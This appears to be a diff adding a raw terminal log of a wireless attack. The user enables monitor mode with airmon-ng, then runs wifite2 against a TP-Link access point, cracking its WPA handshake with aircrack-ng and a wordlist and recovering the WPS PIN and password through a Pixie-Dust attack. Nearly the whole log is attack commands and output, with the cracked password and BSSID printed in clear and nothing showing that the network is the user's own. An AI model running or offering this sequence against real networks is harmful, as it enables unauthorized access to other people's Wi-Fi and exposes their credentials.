@@ -1,0 +1,107 @@
+chillpills㉿ChillPills: sudo su
+root㉿ChillPills: ifconfig
+
+wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.0.5  netmask 255.255.255.0  broadcast 192.168.0.255
+        inet6 fe80::6067:1787:ad53:562e  prefixlen 64  scopeid 0x20<link>
+        ether 6c:fd:b9:c5:37:3f  txqueuelen 1000  (Ethernet)
+        RX packets 35  bytes 4238 (4.1 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 33  bytes 4172 (4.0 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root㉿ChillPills: airmon-ng start wlan0   
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+    580 NetworkManager
+   2200 wpa_supplicant
+
+PHY     Interface       Driver          Chipset
+
+phy1    wlan0           ath9k_htc       Qualcomm Atheros Communications AR9271 802.11n
+                (mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
+                (mac80211 station mode vif disabled for [phy1]wlan0)
+
+root㉿ChillPills: ifconfig
+
+wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        unspec 6C-FD-B9-C5-37-3F-00-84-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
+        RX packets 6012  bytes 1036260 (1011.9 KiB)
+        RX errors 0  dropped 6012  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root㉿ChillPills: wifite --kill 
+   .               .    
+ .´  ·  .     .  ·  `.  wifite2 2.7.0
+ :  :  :  (¯)  :  :  :  a wireless auditor by derv82
+ `.  ·  ` /¯\ ´  ·  .´  maintained by kimocoder
+   `     /¯¯¯\     ´    https://github.com/kimocoder/wifite2
+
+ [+] option: kill conflicting processes enabled
+ [!] Killing 2 conflicting processes
+ [!] stopping NetworkManager (systemctl stop NetworkManager)
+ [!] Terminating conflicting process wpa_supplicant (PID 2200)
+
+ [+] Using wlan0mon already in monitor mode                                                                                                                                                                                                
+
+   NUM                      ESSID   CH  ENCR    PWR    WPS  CLIENT                                                                                                                                                                         
+   ---  -------------------------  ---  -----   ----   ---  ------
+     1             TP-Link_A586    10  WPA-P   35db    no                                                                                                                                                                                
+ [+] Select target(s) (1-15) separated by commas, dashes or all: 1  
+
+
+ [+] TP-Link_A586 (35db) WPA Handshake capture: found existing handshake for TP-Link_A586                                                                                                                                                  
+ [+] Using handshake from hs/handshake_TPLinkA586_3C-84-6A-3E-A5-86_2024-11-14T19-22-47.cap
+
+ [+] analysis of captured handshake file:
+ [+]   tshark: .cap file contains a valid handshake for (3c:84:6a:3e:a5:86)
+ [+] aircrack: .cap file contains a valid handshake for (3C:84:6A:3E:A5:86)
+
+ [+] Cracking WPA Handshake: Running aircrack-ng with wordlist-probable.txt wordlist
+ [+] Cracking WPA Handshake: 0.12% ETA: 23s @ 8808.0kps (current key: Pa()LA.;361989me)                                                                                                                                                    
+ [+] Cracked WPA Handshake PSK: Pa()LA.;361989me
+
+ [+]   Access Point Name: TP-Link_A586
+ [+]  Access Point BSSID: 3C:84:6A:3E:A5:86
+ [+]          Encryption: WPA
+ [+]      Handshake File: hs/handshake_TPLinkA586_3C-84-6A-3E-A5-86_2024-11-14T19-22-47.cap
+ [+]      PSK (password): Pa()LA.;361989me
+ [+] TP-Link_A586 already exists in cracked.json, skipping.
+ [+] Finished attacking 1 target(s), exiting                                                                                                                                                                                               
+ [!] You can restart NetworkManager when finished (service NetworkManager start)
+
+
+root㉿ChillPills: wifite
+
+.               .    
+ .´  ·  .     .  ·  `.  wifite2 2.7.0
+ :  :  :  (¯)  :  :  :  a wireless auditor by derv82
+ `.  ·  ` /¯\ ´  ·  .´  maintained by kimocoder
+   `     /¯¯¯\     ´    https://github.com/kimocoder/wifite2
+
+
+ [+] Using wlan0mon already in monitor mode                                                                                                                                                                                                
+
+   NUM                      ESSID   CH  ENCR    PWR    WPS  CLIENT                                                                                                                                                                         
+   ---  -------------------------  ---  -----   ----   ---  ------                                                                                                                                                                            
+     1              TP-Link_A586     3  WPA-P   46db   yes                                                                                                                                                                                 
+                                                                                                                                                                                     
+ [+] Select target(s) (1-11) separated by commas, dashes or all: 1                                                                                                                                                                      
+
+ [+] (1/1) Starting attacks against 3C:84:6A:3E:A5:86 (TP-Link_A586)
+
+ [+] TP-Link_A586 (48db) WPS Pixie-Dust: [4m57s] Cracked WPS PIN: 82036348                                                                                                                                                                 
+ [+] TP-Link_A586 (48db) WPS Pixie-Dust: [4m57s] Retrieving PSK using bully...
+ [+]        ESSID: TP-Link_A586                                                                                                                                                                                                            
+ [+]        BSSID: 3C:84:6A:3E:A5:86
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 82036348
+ [+] PSK/Password: Pa()LA.;361989me
+ [+] saved crack result to cracked.json (20 total)
+ [+] Finished attacking 1 target(s), exiting
